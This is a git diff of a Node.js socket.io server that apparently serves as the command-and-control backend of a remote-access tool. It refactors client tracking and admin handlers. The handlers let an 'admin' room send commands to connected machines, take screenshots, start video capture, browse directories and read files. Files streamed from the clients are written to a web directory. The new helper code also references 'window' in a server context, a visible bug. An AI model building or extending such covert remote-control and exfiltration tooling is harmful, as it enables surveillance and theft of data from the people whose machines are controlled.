@@ -11,17 +11,27 @@ const io = require("socket.io")(httpServer, {
 const ss = require("socket.io-stream");
 const fs = require("fs");
 
-class util {}
-util.IdIndex = function (id) {
-  for (let i = 0; i < clientArr.length; i++) {
-    if (clientArr[i].id === id) {
-      return i;
+class myUtils {
+  static clientArr = [];
+  static IdIndex(id) {
+    for (let i = 0; i < this.clientArr.length; i++) {
+      if (this.clientArr[i].id === id) {
+        return i;
+      }
     }
+    return -1;
   }
-  return -1;
-};
+  static getClientById(id) {
+    for (const client of window.clientArr) {
+      if (client["id"] == id) {
+        return client;
+      }
+    }
+    return false;
+  }
+  static getClientArr(id) {}
+}
 
-var clientArr = [];
 var cmdResult = {
   data: "",
 };
@@ -44,11 +54,11 @@ io.on("connection", (sk) => {
       ...information,
     };
     // console.log(obj);
-    clientArr.push(obj);
+    myUtils.clientArr.push(obj);
   });
 
   sk.on("updateinfo", (newInfo) => {
-    for (const obj of clientArr) {
+    for (const obj of myUtils.clientArr) {
       if (obj["id"] == sk.id) {
         for (const objKey in obj) {
           for (const key in newInfo) {
@@ -59,10 +69,6 @@ io.on("connection", (sk) => {
         }
       }
     }
-  });
-
-  sk.on("apidialog", (id) => {
-    sk.to(id).emit("dialog");
   });
 
   sk.on("dialog", (dialogContent) => {
@@ -78,14 +84,55 @@ io.on("connection", (sk) => {
     console.log(reason);
     cmdResult.data = reason;
     // 删除数组中刚断开连接的元素
-    if (util.IdIndex(sk.id) > -1) {
-      clientArr.splice(util.IdIndex(sk.id), 1);
+    if (myUtils.IdIndex(sk.id) > -1) {
+      myUtils.clientArr.splice(myUtils.IdIndex(sk.id), 1);
     }
   });
 
+  sk.on("screenshot", (imgBuffer) => {
+    sk.to("admin").emit("apigetscreenshot", imgBuffer);
+  });
+
+  sk.on("debug", (msg) => {
+    sk.to("admin").emit("debug", msg);
+  });
+
+  ss(sk).on("downloadfile", (stream, fileName) => {
+    // ss(sk).to("admin").emit("apidownloadfile", stream);
+    // console.log(777);
+    // console.log(stream);
+    // if (!fs.existsSync("tmpDir")) {
+    //   fs.mkdirSync("tmpDir");
+    // }
+    const to = fs.createWriteStream(`/Linux/var/www/tmpDir/${fileName}`);
+    to.on("finish", () => {
+      sk.to("admin").emit("apidownloadfile", fileName);
+    });
+    stream.pipe(to);
+    // let stream2 = ss.createStream();
+    // ss(sk).to("admin").emit("apidownloadfile", stream2);
+    // stream.pipe(stream2);
+  });
+
+  sk.on("listdir", (result, url) => {
+    sk.to("admin").emit("apilistdir", result, url);
+  });
+
+  sk.on("showfilecontent", (result, url) => {
+    sk.to("admin").emit("apishowfilecontent", result, url);
+  });
+
+  sk.emit("message", "hello from ser");
+});
+
+//admin段api
+io.on("connection", (sk) => {
+  sk.on("apidialog", (id) => {
+    sk.to(id).emit("dialog");
+  });
   sk.on("apigetallclients", () => {
     // console.log(clientArr)
-    sk.emit("apigetallclients", clientArr);
+    sk.emit("apigetallclients", myUtils.clientArr);
   });
 
   sk.on("apisendcmd", (id, cmd) => {
@@ -117,75 +164,30 @@ io.on("connection", (sk) => {
     sk.to(id).emit("screenshot");
   });
 
-  sk.on("screenshot", (imgBuffer) => {
-    sk.to("admin").emit("apigetscreenshot", imgBuffer);
-  });
-
-  sk.on("debug", (msg) => {
-    sk.to("admin").emit("debug", msg);
-  });
-
   //FileExplorer
   sk.on("apilistdir", (id, dir) => {
     sk.to(id).emit("listdir", dir);
-  });
-
-  // sk.on("apidownloadfile", (id, fileName) => {
-  //   sk.to(id).emit("downloadfile", fileName);
-  //   // ss(sk).to(id).emit("downloadfile",)
-  // });
-  sk.on("apidownloadfile", (id, fileName) => {
-    // ss(sk).to(id).emit("downloadfile", fileName);
-    console.log(fileName);
-    sk.to(id).emit("downloadfile", fileName);
-  });
-
-  ss(sk).on("downloadfile", (stream, fileName) => {
-    // ss(sk).to("admin").emit("apidownloadfile", stream);
-    // console.log(777);
-    // console.log(stream);
-    // if (!fs.existsSync("tmpDir")) {
-    //   fs.mkdirSync("tmpDir");
-    // }
-    const to = fs.createWriteStream(`/Linux/var/www/tmpDir/${fileName}`);
-    to.on("finish", () => {
-      sk.to("admin").emit("apidownloadfile", fileName);
-    });
-    stream.pipe(to);
-    // let stream2 = ss.createStream();
-    // ss(sk).to("admin").emit("apidownloadfile", stream2);
-    // stream.pipe(stream2);
   });
 
   sk.on("apishowfilecontent", (id, fileName) => {
     sk.to(id).emit("showfilecontent", fileName);
   });
 
-  sk.on("listdir", (result, url) => {
-    sk.to("admin").emit("apilistdir", result, url);
-  });
-
-  // sk.on("downloadfile", (fileContent) => {
-  //   sk.to("admin").emit("apidownloadfile", fileContent);
-  // });
-
-  sk.on("showfilecontent", (result, url) => {
-    sk.to("admin").emit("apishowfilecontent", result, url);
+  sk.on("apidownloadfile", (id, fileName) => {
+    // ss(sk).to(id).emit("downloadfile", fileName);
+    console.log(fileName);
+    sk.to(id).emit("downloadfile", fileName);
   });
 
   sk.on("apistartvideocapture", (id) => {
     sk.to(id).emit("startvideocapture");
-    clientArr[util.IdIndex(id)].streaming = true;
+    myUtils.clientArr[myUtils.IdIndex(id)].streaming = true;
   });
 
   sk.on("apistopvideocapture", (id) => {
     sk.to(id).emit("stopvideocapture");
-    clientArr[util.IdIndex(id)].streaming = false;
+    myUtils.clientArr[myUtils.IdIndex(id)].streaming = false;
   });
-
-  // sk.on("startvideocapture", () => {});
-
-  sk.emit("message", "hello from ser");
 });
 
 const koa = require("koa");
@@ -217,3 +219,8 @@ app.use(async (ctx) => {
 httpServer.listen(7070);
 
 app.listen(7071);
+
+module.exports = {
+  io: io,
+  myUtils: myUtils,
+};
